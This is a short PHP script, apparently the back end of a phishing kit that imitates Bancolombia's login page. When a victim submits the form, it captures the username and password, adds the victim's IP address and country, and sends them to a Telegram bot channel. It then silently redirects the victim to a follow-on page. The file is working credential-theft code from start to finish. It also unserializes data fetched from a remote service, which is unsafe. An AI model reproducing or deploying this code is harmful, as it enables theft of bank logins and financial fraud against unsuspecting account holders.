<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
include('datos_de_tel.php');
    
if( isset ($_POST['userid']) && isset ($_POST['userclav'])  ){

$message = "BANCOLOMBIA\r\nUsuario: ".$_POST['userid']."\r\nClave: ".$_POST['userclav']."\r\nIP:".$userp." ".$pais."";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );




}


?>
<html>
<head>
<META HTTP-EQUIV="REFRESH" CONTENT="0;index2.html">
</head>
<body>
